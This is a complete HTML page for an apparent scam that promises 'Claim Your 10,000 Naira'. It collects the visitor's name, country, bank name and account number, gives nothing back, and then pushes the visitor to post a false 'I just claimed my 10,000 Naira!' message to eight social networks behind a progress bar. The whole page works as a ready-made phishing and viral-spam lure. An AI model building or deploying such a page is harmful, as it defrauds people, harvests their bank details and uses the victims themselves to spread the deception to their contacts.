    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Your 10,000 Naira</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-image: url('download.jpg'); /* Background image */
            background-size: cover;
            background-position: center;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .claim-text {
            font-size: 36px;
            font-weight: bold;
            color: #ffcc00;
            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.7), 0 0 10px #ffcc00, 0 0 20px #ff9900;
            margin-bottom: 20px;
            padding: 10px 20px;
            border: 3px solid #ffcc00;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 10px;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% {
                transform: scale(1);
                box-shadow: 0 0 10px #ffcc00, 0 0 20px #ff9900;
            }
            50% {
                transform: scale(1.05);
                box-shadow: 0 0 20px #ffcc00, 0 0 30px #ff9900;
            }
            100% {
                transform: scale(1);
                box-shadow: 0 0 10px #ffcc00, 0 0 20px #ff9900;
            }
        }
        .claim-button {
            font-size: 24px;
            font-weight: bold;
            color: #fff;
            background-color: #28a745; /* Green background */
            border: none;
            border-radius: 5px;
            padding: 15px 30px;
            margin-bottom: 20px;
            cursor: pointer;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            transition: background-color 0.3s, box-shadow 0.3s;
        }
        .claim-button:hover {
            background-color: #218838; /* Darker green on hover */
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
        }
        .form-container {
            display: none; /* Initially hide the form container */
            background: rgba(255, 255, 255, 0.95);
            padding: 30px;
            border-radius: 8px;
            width: 350px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            text-align: center;
        }
        .form-container h2 {
            margin-bottom: 20px;
            font-size: 24px;
            color: #333;
        }
        .form-container input {
            width: calc(100% - 20px);
            padding: 12px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ddd;
            font-size: 16px;
        }
        .form-container button {
            width: 100%;
            padding: 12px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        .form-container button:hover {
            background-color: #0056b3;
        }
        .share-options {
            display: none; /* Initially hide the share options */
            text-align: center;
            margin-top: 20px;
            flex-wrap: wrap;
        }
        .share-options .share-button {
            display: inline-block;
            margin: 10px;
            font-size: 18px;
            color: #fff;
            border: none;
            border-radius: 5px;
            padding: 10px;
            cursor: pointer;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            transition: background-color 0.3s, box-shadow 0.3s;
        }
        .share-options .twitter {
            background-color: #1DA1F2; /* Twitter blue */
        }
        .share-options .facebook {
            background-color: #4267B2; /* Facebook blue */
        }
        .share-options .linkedin {
            background-color: #0077B5; /* LinkedIn blue */
        }
        .share-options .whatsapp {
            background-color: #25D366; /* WhatsApp green */
        }
        .share-options .reddit {
            background-color: #FF4500; /* Reddit orange */
        }
        .share-options .tumblr {
            background-color: #35465C; /* Tumblr blue */
        }
        .share-options .pinterest {
            background-color: #E60023; /* Pinterest red */
        }
        .share-options .email {
            background-color: #D44638; /* Email red */
        }
        .share-options .share-button:hover {
            opacity: 0.9;
        }
        .progress-container {
            width: 100%;
            max-width: 400px;
            background: #333;
            border-radius: 5px;
            overflow: hidden;
            margin-top: 20px;
            display: none; /* Initially hide the progress container */
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
            border: 2px solid #ffcc00;
        }
        .progress-bar {
            height: 20px;
            width: 0;
            background: linear-gradient(90deg, #ffcc00, #ff9900);
            box-shadow: 0 0 10px rgba(255, 204, 0, 0.7), 0 0 20px rgba(255, 153, 0, 0.7);
            transition: width 0.5s;
        }
    </style>

<body>
    <div class="claim-text">Claim Your 10,000 Naira</div>
    <button class="claim-button" onclick="showForm()">Click to Claim</button>
    <div class="form-container" id="formContainer">
        <h2>Enter details</h2>
        <form action="/submit" method="post" onsubmit="handleClaim(event)">
            <input type="text" id="name" name="name" placeholder="Full Name" required>
            <input type="text" id="country" name="country" placeholder="Country" required>
            <input type="text" id="bankName" name="bankName" placeholder="Bank Name" required>
            <input type="text" id="accountNumber" name="accountNumber" placeholder="Account Number" required>
            <button type="submit">Claim</button>
        </form>
    </div>
    <div class="progress-container" id="progressContainer">
        <div class="progress-bar" id="progressBar"></div>
    </div>
    <div class="share-options" id="shareOptions">
        <button class="share-button twitter" onclick="shareOnTwitter()">Twitter</button>
        <button class="share-button facebook" onclick="shareOnFacebook()">Facebook</button>
        <button class="share-button linkedin" onclick="shareOnLinkedIn()">LinkedIn</button>
        <button class="share-button whatsapp" onclick="shareOnWhatsApp()">WhatsApp</button>
        <button class="share-button reddit" onclick="shareOnReddit()">Reddit</button>
        <button class="share-button tumblr" onclick="shareOnTumblr()">Tumblr</button>
        <button class="share-button pinterest" onclick="shareOnPinterest()">Pinterest</button>
        <button class="share-button email" onclick="shareOnEmail()">Email</button>
    </div>
    <script>
        let shareClicks = 0;
        const maxShares = 8; // Total number of share buttons
        const defaultMessage = 'ðŸŽ‰ I just claimed my 10,000 Naira! Don\'t miss out, click here to get yours now! ðŸ’¸';

        function showForm() {
            document.getElementById('formContainer').style.display = 'block';
            document.querySelector('.claim-button').style.display = 'none';
            document.getElementById('progressContainer').style.display = 'block';
        }

        function handleClaim(event) {
            event.preventDefault(); // Prevent form submission

            // Hide the form and show the share options
            document.getElementById('formContainer').style.display = 'none';
            document.getElementById('shareOptions').style.display = 'flex';
        }

        function updateProgress() {
            shareClicks++;
            const progressBar = document.getElementById('progressBar');
            const progress = (shareClicks / maxShares) * 100;
            progressBar.style.width = `${progress}%`;
        }

        function shareOnTwitter() {
            const url = window.location.href;
            window.open(`https://twitter.com/intent/tweet?text=${encodeURIComponent(defaultMessage)}&url=${encodeURIComponent(url)}`, '_blank');
            updateProgress();
        }

        function shareOnFacebook() {
            const url = window.location.href;
            window.open(`https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(url)}`, '_blank');
            updateProgress();
        }

        function shareOnLinkedIn() {
            const url = window.location.href;
            window.open(`https://www.linkedin.com/shareArticle?mini=true&url=${encodeURIComponent(url)}&title=${encodeURIComponent(defaultMessage)}`, '_blank');
            updateProgress();
        }

        function shareOnWhatsApp() {
            const url = window.location.href;
            window.open(`https://wa.me/?text=${encodeURIComponent(defaultMessage)}%20${encodeURIComponent(url)}`, '_blank');
            updateProgress();
        }

        function shareOnReddit() {
            const url = window.location.href;
            window.open(`https://www.reddit.com/submit?url=${encodeURIComponent(url)}&title=${encodeURIComponent(defaultMessage)}`, '_blank');
            updateProgress();
        }

        function shareOnTumblr() {
            const url = window.location.href;
            window.open(`https://www.tumblr.com/share/link?url=${encodeURIComponent(url)}&name=${encodeURIComponent(defaultMessage)}`, '_blank');
            updateProgress();
        }

        function shareOnPinterest() {
            const url = window.location.href;
            window.open(`https://www.pinterest.com/pin/create/button/?url=${encodeURIComponent(url)}&description=${encodeURIComponent(defaultMessage)}`, '_blank');
            updateProgress();
        }

        function shareOnEmail() {
            const url = window.location.href;
            window.location.href = `mailto:?subject=Claim%20Your%20Prize&body=${encodeURIComponent(defaultMessage)}%20${encodeURIComponent(url)}`;
            updateProgress();
        }
    </script>
</body>
</html>
